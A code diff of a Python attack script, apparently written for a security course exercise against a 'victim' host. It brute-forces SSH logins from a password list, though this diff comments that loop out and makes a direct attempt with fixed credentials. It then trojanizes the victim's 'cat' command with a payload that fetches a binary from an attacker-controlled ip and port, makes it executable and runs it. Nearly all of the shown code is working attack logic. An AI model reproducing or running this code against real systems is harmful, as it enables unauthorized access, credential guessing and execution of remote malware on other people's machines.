@@ -34,7 +34,7 @@ def trySSH(hostname, username, password):
         time.sleep(1)
         client.exec_command('cat c.zip >> cat')
         time.sleep(1)
-        client.exec_command("printf '\xaf\xbe\xad\xde' >> cat")
+        client.exec_command(r'echo -n -e \\xaf\\xbe\\xad\\xde >> cat')
         client.exec_command('rm c.zip')
         client.exec_command('rm c')
         return True
@@ -55,7 +55,19 @@ if __name__ == "__main__":
     payload += ip
     payload += '/'
     payload += port
-    payload += ";cat <&5 > w;chmod +x w;./w \"$1\";exit 0;\n' > cat"
+    payload += ";cat <&5 > w;chmod +x w;./w "
+
+    #length aside from the tailing size
+    length = len(payload)+7
+    #length of tailing size
+    length += len(str(length))
+    payload += str(length)
+    
+    payload += " \"$1\";exit 0;\n' > cat"
+
+    trySSH(victim, 'csc2022', 'csc2022')
+    
+'''
     passlist = open('materials/victim.dat').read().splitlines()
     els = []
     for i in range(1, len(passlist)+1):
@@ -63,3 +75,4 @@ if __name__ == "__main__":
     for password in els:
         if trySSH(victim, 'csc2022', ''.join(password)):
             break
+'''
